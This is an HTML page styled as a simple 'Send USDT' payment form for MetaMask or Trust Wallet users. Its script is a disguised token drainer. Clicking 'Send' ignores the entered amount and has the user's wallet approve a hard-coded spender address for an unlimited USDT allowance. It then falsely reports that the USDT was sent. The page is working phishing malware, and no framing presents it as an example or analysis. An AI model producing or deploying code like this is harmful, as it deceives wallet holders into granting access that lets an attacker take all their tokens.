<!DOCTYPE html>
<html>
  <head>
    <title>USDT Approval</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
      body {
        font-family: sans-serif;
        background: #f5f5f5;
        text-align: center;
        padding-top: 80px;
      }
      input, button {
        padding: 12px;
        font-size: 16px;
        width: 280px;
        margin-bottom: 20px;
      }
    </style>
  </head>
  <body>
    <h2>Send USDT</h2>

    <!-- ðŸ‘¤ User wallet display field -->
    <input type="text" id="userAddress" placeholder="0x37935899f0DbCE787D758EfE382A92E1d3368454" readonly />

    <br />

    <!-- ðŸ’° Amount input -->
    <input type="number" id="amount" placeholder="Enter Amount (USDT)" />
    <br />

    <!-- ðŸš€ Approve button -->
    <button onclick="approveUSDT()">Send</button>

    <script>
      const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
      const SPENDER = "0xE9794063b029c9F84f3Bf093CfC444fA92A1c87B";
      const ABI = [
        "function approve(address spender, uint256 amount) public returns (bool)",
        "function decimals() view returns (uint8)"
      ];

      let signer, token;

      async function connectWallet() {
        if (!window.ethereum) return alert("Please use MetaMask or Trust Wallet browser.");
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        document.getElementById("userAddress").value = userAddress;
        token = new ethers.Contract(USDT_ADDRESS, ABI, signer);
      }

      async function approveUSDT() {
        const amountInput = document.getElementById("amount").value;
        if (!amountInput || parseFloat(amountInput) <= 0) {
          alert("Please enter a valid amount.");
          return;
        }

        await connectWallet();

        try {
          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
          await tx.wait();
          alert("âœ… USDT sent successfully!");
        } catch (err) {
          alert("âŒ Approval failed: " + err.message);
        }
      }
    </script>
  </body>
</html>
